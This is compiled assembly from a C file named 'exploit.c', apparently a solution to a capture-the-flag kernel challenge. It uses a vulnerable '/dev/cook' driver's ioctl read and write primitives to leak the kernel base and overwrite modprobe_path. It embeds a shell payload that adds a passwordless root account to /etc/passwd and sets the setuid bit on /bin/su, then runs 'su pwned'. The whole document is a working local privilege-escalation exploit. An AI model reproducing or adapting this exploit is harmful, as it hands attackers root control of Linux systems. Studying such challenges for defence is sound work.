	.file	"exploit.c"
	.text
	.comm	global_fd,4,4
	.comm	image_base,8,8
	.globl	_sioctl
	.type	_sioctl, @function
_sioctl:
.LFB6:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movq	%rdi, -8(%rbp)
	movq	%rsi, -16(%rbp)
	movl	global_fd(%rip), %eax
	movq	-16(%rbp), %rdx
	movq	-8(%rbp), %rcx
	movq	%rcx, %rsi
	movl	%eax, %edi
	movl	$0, %eax
	call	ioctl@PLT
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE6:
	.size	_sioctl, .-_sioctl
	.section	.rodata
.LC0:
	.string	"/dev/cook"
.LC1:
	.string	"[!] Failed to open device"
.LC2:
	.string	"[*] Device opened"
	.text
	.globl	open_dev
	.type	open_dev, @function
open_dev:
.LFB7:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$2, %esi
	leaq	.LC0(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, global_fd(%rip)
	movl	global_fd(%rip), %eax
	testl	%eax, %eax
	jns	.L3
	leaq	.LC1(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L3:
	leaq	.LC2(%rip), %rdi
	call	puts@PLT
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE7:
	.size	open_dev, .-open_dev
	.globl	aaw
	.type	aaw, @function
aaw:
.LFB8:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%rdi, -40(%rbp)
	movq	%rsi, -48(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	-40(%rbp), %rax
	movq	%rax, -32(%rbp)
	movq	-48(%rbp), %rax
	movq	%rax, -24(%rbp)
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	movl	$64222, %edi
	call	_sioctl
	nop
	movq	-8(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L5
	call	__stack_chk_fail@PLT
.L5:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE8:
	.size	aaw, .-aaw
	.globl	aar
	.type	aar, @function
aar:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%rdi, -40(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movabsq	$-3819410105021120785, %rax
	movq	%rax, -32(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -24(%rbp)
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	movl	$26985, %edi
	call	_sioctl
	movq	-32(%rbp), %rax
	movq	-8(%rbp), %rdx
	xorq	%fs:40, %rdx
	je	.L8
	call	__stack_chk_fail@PLT
.L8:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	aar, .-aar
	.section	.rodata
.LC3:
	.string	"/home/blud/x"
.LC4:
	.string	"[!] Trigger creation failed"
.LC5:
	.string	"[!] Error chmod trigger"
	.text
	.globl	modprobe_init
	.type	modprobe_init, @function
modprobe_init:
.LFB10:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$32, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$66, %esi
	leaq	.LC3(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -20(%rbp)
	cmpl	$0, -20(%rbp)
	jns	.L10
	leaq	.LC4(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L10:
	movl	$-1, -13(%rbp)
	movb	$0, -9(%rbp)
	leaq	-13(%rbp), %rcx
	movl	-20(%rbp), %eax
	movl	$5, %edx
	movq	%rcx, %rsi
	movl	%eax, %edi
	call	write@PLT
	movl	-20(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	$511, %esi
	leaq	.LC3(%rip), %rdi
	call	chmod@PLT
	testl	%eax, %eax
	je	.L13
	leaq	.LC5(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L13:
	nop
	movq	-8(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L12
	call	__stack_chk_fail@PLT
.L12:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE10:
	.size	modprobe_init, .-modprobe_init
	.section	.rodata
.LC6:
	.string	"/home/blud/p"
.LC7:
	.string	"[!] Unable to create %s\n"
	.align 8
.LC8:
	.string	"#!/bin/sh\necho 'pwned::0:0:root:/:/bin/sh' >> /etc/passwd\n/bin/chown root:root /bin/su\n/bin/chmod +s /bin/su"
.LC9:
	.string	"[!] Error chmod pwn"
	.text
	.globl	pwn_init
	.type	pwn_init, @function
pwn_init:
.LFB11:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$66, %esi
	leaq	.LC6(%rip), %rdi
	movl	$0, %eax
	call	open@PLT
	movl	%eax, -4(%rbp)
	cmpl	$0, -4(%rbp)
	jns	.L15
	leaq	.LC6(%rip), %rsi
	leaq	.LC7(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$1, %edi
	call	exit@PLT
.L15:
	movl	-4(%rbp), %eax
	leaq	.LC8(%rip), %rsi
	movl	%eax, %edi
	movl	$0, %eax
	call	dprintf@PLT
	movl	-4(%rbp), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	$511, %esi
	leaq	.LC6(%rip), %rdi
	call	chmod@PLT
	testl	%eax, %eax
	je	.L17
	leaq	.LC9(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L17:
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE11:
	.size	pwn_init, .-pwn_init
	.section	.rodata
.LC10:
	.string	"[*] leak: 0x%lx\n"
.LC11:
	.string	"[*] image base @ 0x%lx\n"
.LC12:
	.string	"[!] Incorrect image base"
.LC13:
	.string	"[*] overwritten modprobe_path"
.LC14:
	.string	"/home/blud/x 2>/dev/null"
.LC15:
	.string	"cat /etc/passwd"
.LC16:
	.string	"su pwned"
	.text
	.globl	main
	.type	main, @function
main:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$48, %rsp
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	call	open_dev
	movabsq	$-2199023243440, %rdi
	call	aar
	movq	%rax, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC10(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-40(%rbp), %rax
	shrq	$20, %rax
	subq	$14, %rax
	salq	$20, %rax
	movq	%rax, image_base(%rip)
	movq	image_base(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC11(%rip), %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	image_base(%rip), %rax
	andl	$1048575, %eax
	testq	%rax, %rax
	je	.L19
	leaq	.LC12(%rip), %rdi
	call	puts@PLT
	movl	$1, %edi
	call	exit@PLT
.L19:
	movq	image_base(%rip), %rax
	addq	$25502752, %rax
	movq	%rax, -32(%rbp)
	movabsq	$7809856816488081455, %rax
	movq	%rax, -17(%rbp)
	movb	$0, -9(%rbp)
	leaq	-17(%rbp), %rdx
	movq	-32(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	aaw
	movl	$1882154101, -22(%rbp)
	movb	$0, -18(%rbp)
	leaq	-22(%rbp), %rax
	movq	-32(%rbp), %rdx
	addq	$8, %rdx
	movq	%rax, %rsi
	movq	%rdx, %rdi
	call	aaw
	leaq	.LC13(%rip), %rdi
	call	puts@PLT
	movl	$0, %eax
	call	modprobe_init
	movl	$0, %eax
	call	pwn_init
	leaq	.LC14(%rip), %rdi
	call	system@PLT
	leaq	.LC15(%rip), %rdi
	call	system@PLT
	leaq	.LC16(%rip), %rdi
	call	system@PLT
	movl	global_fd(%rip), %eax
	movl	%eax, %edi
	call	close@PLT
	movl	$0, %eax
	movq	-8(%rbp), %rcx
	xorq	%fs:40, %rcx
	je	.L21
	call	__stack_chk_fail@PLT
.L21:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
